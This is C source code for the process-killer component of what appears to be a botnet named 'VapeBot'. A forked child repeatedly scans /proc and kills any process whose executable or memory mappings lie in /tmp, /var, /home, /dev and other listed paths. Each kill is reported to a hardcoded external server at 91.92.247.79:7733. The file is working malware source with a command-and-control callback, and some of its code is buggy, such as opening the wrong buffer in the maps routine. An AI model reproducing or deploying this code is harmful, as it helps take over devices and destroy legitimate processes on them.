#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "headers/includes.h"

int killer_pid;
const char *whitelisted[] = {
	"/bin/sys_monitor_cnr",
	"/bin/busybox"
};

const char *blacklisted[] = {
    "/tmp",
    "/var",
    "/mnt",
    "/root",
    "/boot",
    "/sbin",
    "/home",
    "/dev",
    "/.",
    "./",
    "(deleted)"
};

void report_kill(const char *message)
{
    if (strcmp(message, "EOF") == 0 || strlen(message) <= 0)
        return;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
       return;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(7733);

    inet_pton(AF_INET, "91.92.247.79", &(server_addr.sin_addr));
    connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    write(sockfd, message, strlen(message));
}

bool is_whitelisted(const char *maps)
{
    for (int i = 0; i < sizeof(whitelisted) / sizeof(whitelisted[0]); i++) {
        if (strstr(whitelisted[i], maps))
            return true;
    }

    return false;
}

void killer_exe() /* finds and kills processes using /proc/pid/exe */
{
    DIR *dir;
    struct dirent *entry;

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((entry = readdir(dir)))
    {
        int pid = atoi(entry->d_name);
        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        if (pid > 0)
        {
            char proc_path[BUFFER];
            char exe_path[BUFFER];
            char link_path[BUFFER];

            snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
            ssize_t len = readlink(proc_path, link_path, sizeof(link_path));
            if (len == -1)
                continue;

            link_path[len] = '\0';
            if (is_whitelisted(link_path))
            	continue;

            for (int i = 0; i < sizeof(blacklisted) / sizeof(blacklisted[0]); ++i)
            {
                if (strstr(link_path, blacklisted[i]) != NULL)
                {
                    char message[256];
                    snprintf(message, sizeof(message), "[VapeBot/Killer/EXE] Killed process: %s, PID: %d\n", link_path, pid);
                    if (kill(pid, 9) == 0)
                    {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                        continue;
                    }
                }
            }
        }
    }
}

void killer_maps() /* finds and kills processes using /proc/pid/maps */
{
    DIR *dir;
    struct dirent *file;
    char maps_path[BUFFER];
    char maps_line[BUFFER];

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((file = readdir(dir)) != NULL)
    {
        int pid = atoi(file->d_name);
        if (pid == killer_pid || pid == getppid() || pid == killer_pid || pid == 0 || pid == 1)
            continue;

        snprintf(maps_path, BUFFER, "/proc/%d/maps", pid);

        FILE *maps_file = fopen(maps_line, "r");
        if (maps_file == NULL)
            continue;

        while (fgets(maps_line, sizeof(maps_line), maps_file) != NULL)
        {
            char *pos = strchr(maps_line, ' ');
            if (pos != NULL)
                *pos = '\0';

            if (is_whitelisted(maps_line))
            	continue;

            for (int i = 0; i < sizeof(blacklisted) / sizeof(blacklisted[0]); ++i)
            {
                if (strstr(maps_line, blacklisted[i]) != NULL)
                {
                    char message[256];
                    snprintf(message, sizeof(message), "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d\n", maps_line, pid);
                    if (kill(pid, 9) == 0)
                    {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                        continue;
                    }
                }
            }
        }

        fclose(maps_file);
    }

    closedir(dir);
}

void killer_init() /* creates a child process, and indefinitely executes the killers every 300ms */
{
	int child;
    child = fork();
	if(child > 0 || child == 1)
		return;

	killer_pid = getpid();
    prctl(PR_SET_PDEATHSIG, SIGHUP); /* make sure all processes die */
    while (1)
    {
    	killer_exe();
    	killer_maps();
        usleep(300000);
    }
}
